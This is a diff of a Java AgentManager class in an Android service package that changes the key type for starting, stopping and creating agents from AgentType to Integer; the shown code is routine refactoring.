@@ -17,7 +17,7 @@ import com.android.service.util.Check;
 /**
  * The Class AgentManager.
  */
-public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
+public class AgentManager extends Manager<AgentBase, Integer, Integer> {
 
 	/** The Constant TAG. */
 	private static final String TAG = "AgentManager";
@@ -49,7 +49,7 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 	 * @return true, if successful
 	 */
 	public synchronized boolean startAll() {
-		HashMap<AgentType, AgentConf> agents;
+		HashMap<Integer, AgentConf> agents;
 		agents = status.getAgentsMap();
 
 		if (agents == null) {
@@ -62,10 +62,10 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 			return false;
 		}
 
-		final Iterator<AgentType> it = agents.keySet().iterator();
+		final Iterator<Integer> it = agents.keySet().iterator();
 
 		while (it.hasNext()) {
-			final AgentType key = it.next();
+			final Integer key = it.next();
 			if(Cfg.DEBUG) Check.asserts(key != null, "null type");
 			AgentConf conf = agents.get(key);
 
@@ -82,12 +82,12 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 	 * Stop agents.
 	 */
 	public synchronized void stopAll() {
-		HashMap<AgentType, AgentConf> agents;
+		HashMap<Integer, AgentConf> agents;
 		agents = status.getAgentsMap();
-		final Iterator<AgentType> it = agents.keySet().iterator();
+		final Iterator<Integer> it = agents.keySet().iterator();
 
 		while (it.hasNext()) {
-			final AgentType key = it.next();
+			final Integer key = it.next();
 			stop(key);
 		}
 
@@ -104,8 +104,8 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 	 * @param key
 	 *            the key
 	 */
-	public synchronized void start(final AgentType key) {
-		HashMap<AgentType, AgentConf> agents;
+	public synchronized void start(final Integer key) {
+		HashMap<Integer, AgentConf> agents;
 
 		agents = status.getAgentsMap();
 
@@ -146,7 +146,7 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 		t.start();
 	}
 
-	private AgentBase makeAgent(AgentType type) {
+	private AgentBase makeAgent(Integer type) {
 		if (running.containsKey(type) == true) {
 			return running.get(type);
 		}
@@ -166,7 +166,7 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 	 * @param key
 	 *            the key
 	 */
-	public synchronized void stop(final AgentType key) {
+	public synchronized void stop(final Integer key) {
 		final AgentBase a = running.get(key);
 		
 		if (a == null) {
